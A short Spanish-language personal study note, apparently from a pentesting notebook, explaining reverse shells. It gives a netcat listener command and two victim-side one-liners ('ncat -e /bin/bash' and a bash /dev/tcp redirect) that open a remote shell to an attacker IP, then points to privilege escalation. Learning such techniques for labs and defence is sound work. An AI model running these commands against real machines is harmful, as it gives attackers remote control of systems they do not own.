---
tags:
  - reverse-shell
---
La _Reverse Shell_ se da cuando la maquina victima se **conecta** con la maquina atacante, a diferencia de las [[Bind Shell]].

---------------

Crear servidor web con python:

```bash
python3 -m http.server -d Escritorio/Hacking/Scripts
```

-m ---> modulos (en este caso http.server)
-d ---> Indica donde va a arrancar el server

-----------------------------------------------------------------
Ponerse en escucha con netcat:

```bash
nc -lvnp 4444
```

_-n_ -> No aplica resolucion DNS
_-l_ -> Listen, eso indica que va a escuchar
_n_ -> Verbose, muestra en pantalla lo que vaya sucediendo
_p_ -> Port, ahi indicas el puerto por el que va a escuchar

y la maquina victima tiene q ejecutar:

```bash
ncat -e /bin/bash 192.168.123.123 4444
```

o puede ejecutar tambien:

```bash
bash -c "bash -i >& /dev/tcp/192.168.123.123/4444 0>&1"
```


----------------------------------------------------------------
---
-----------

Una vez conseguida la _Reverse Shell_ se pueden buscar [[Binarios]] dentro del sistema para posteriormente [[Escalar Privilegios]]

